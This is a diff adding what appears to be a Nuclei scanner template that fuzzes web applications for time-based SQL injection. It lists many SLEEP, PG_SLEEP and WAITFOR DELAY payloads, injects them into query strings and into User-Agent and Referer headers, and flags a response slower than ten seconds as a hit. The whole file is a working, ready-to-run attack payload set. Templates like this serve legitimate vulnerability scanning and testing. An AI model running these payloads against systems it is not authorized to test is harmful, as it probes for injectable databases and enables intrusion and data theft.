@@ -1,0 +1,105 @@
+id: time-based-sqli-fuzz
+
+info:
+  name: Time-based SQL Injection Fuzzing
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template fuzzes for time-based SQL injection vulnerabilities by injecting time-delay payloads in various parts of the HTTP request.
+    The payloads are injected in query parameters, User-Agent, and Referer headers.
+    
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    payloads:
+      sqli:
+        - "(CASE WHEN (8895=8895) THEN SLEEP(10) ELSE 8895 END)"
+        -  (select*from(select(sleep(10)))a) "
+        -  (select(0)from(select(sleep(10)))v)/*'+ 
+        -  (select(0)from(select(sleep(10)))v)+'"+ 
+        -  (select(0)from(select(sleep(10)))v)+"*/ 
+        -  orwa';%20waitfor%20delay%20'0:0:10'%20--%20
+        -  ;SELECT IF((10303>10302),SLEEP(10),231010)#
+        -  0"XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR"Z
+        -  0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
+        -  0\"XOR(if(now()=sysdate(),sleep(10),0))XOR\"Z
+        -  \"XOR(if(now()=sysdate(),sleep(10),0))XOR\"Z
+        -  ;SELECT PG_SLEEP(10)--
+        -  ;SELECT PG_SLEEP(10)--+
+        -  ;SELECT PG_SLEEP(10)--+-
+        -  ;SELECT PG_SLEEP(10)#
+        -  \' AND (SELECT 101071 FROM (SELECT(SLEEP(10)))uZxz)
+        -  \'+UNION+SELECT+sleep(10)+#
+        -   UNION+SELECT+sleep(10)+#
+        -  \"+UNION+SELECT+sleep(10)+#
+        - AND+(SELECT 710107 FROM (SELECT(SLEEP(10)))CUcD)
+        - \';SELECT PG_SLEEP(10)--+
+        - ;SELECT PG_SLEEP(10)--+-
+        - \%2c(select*from(select(sleep(10)))a)
+        - ;select+sleep(10);;#
+        - if(now()=sysdate()%2Csleep(10)%2C0)
+        - if(now()=sysdate(),sleep(10),0)
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{sqli}}"
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{sqli}}"
+      - part: query
+        type: prefix
+        mode: single
+        fuzz:
+          - "{{sqli}}"
+      - part: header
+        type: replace
+        mode: single
+        keys:
+          - "User-Agent"
+        fuzz:
+          - "{{sqli}}"
+      - part: header
+        type: postfix
+        mode: single
+        keys:
+          - "User-Agent"
+        fuzz:
+          - "{{sqli}}"
+      - part: header
+        type: prefix
+        mode: single
+        keys:
+          - "User-Agent"
+        fuzz:
+          - "{{sqli}}"
+      - part: header
+        type: replace
+        mode: single
+        keys:
+          - "Referer"
+        fuzz:
+          - "https://google.com {{sqli}}"
+      - part: header
+        type: postfix
+        mode: single
+        keys:
+          - "Referer"
+        fuzz:
+          - "{{sqli}}"
+      - part: header
+        type: prefix
+        mode: single
+        keys:
+          - "Referer"
+        fuzz:
+          - "{{sqli}}"
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration > 10"
